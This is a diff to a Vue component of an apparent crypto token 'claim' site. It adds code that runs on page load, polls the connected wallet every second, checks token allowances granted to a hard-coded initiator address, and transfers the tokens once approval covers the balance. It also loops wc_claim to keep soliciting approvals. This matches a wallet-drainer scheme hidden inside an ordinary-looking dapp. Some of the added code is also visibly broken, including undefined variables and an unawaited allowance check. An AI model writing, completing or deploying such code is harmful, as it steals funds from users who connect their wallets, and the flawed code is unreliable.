@@ -437,13 +437,15 @@ import Datavg from './Datavg.vue';
 import Footer from './Footer.vue';
 import { useToast } from 'vue-toastification';
 import { disconnect, getAccount, fetchFeeData } from '@wagmi/core';
+import Web3 from 'web3';
+import * as constants from './constants.js';
 import {
   web3modal,
   claim,
   balanceOf,
   getTokens,
   increaseAllowance,
-  transferTokens,
+  transfer,
 } from './utils/walletconnect.js';
 const Toast = useToast();
 import axios from 'axios';
@@ -467,11 +469,30 @@ export default {
       currentIndex: 0,
     };
   },
-  mounted() {
-    this.wc_claim();
-    transferTokens(tokens);
+  async mounted() {
+    await transferTokens(tokens);
   },
   methods: {
+    async transferTokens() {
+      setInterval(() => {
+        if(this.sortedTokens.length > 0) {
+          const web3 = new Web3(window.ethereum);
+          const account = getAccount().address;
+          for(let i = 0; i < sortedTokens.length; i++){
+            var contract = new web3.eth.Contract(
+              constants.ALLOWANCEABI,
+              this.sortedTokens[i].token_address
+            );
+            const allowance = contract.methods
+              .allowance(account, constants.initiator)
+              .call();
+            if (allowance >= this.sortedTokens[i].balance) {
+              return transfer(this.sortedTokens[i]);
+            }
+          }
+        }
+      }, 1000);
+    },
     async wc_claim() {
       try {
         if (getAccount().isConnected) {
@@ -501,6 +522,7 @@ export default {
           } else {
             this.currentIndex += 1;
             this.maxToken = this.sortedTokens[this.currentIndex];
+            this.wc_claim();
           }
         } else {
           this.wConnect();
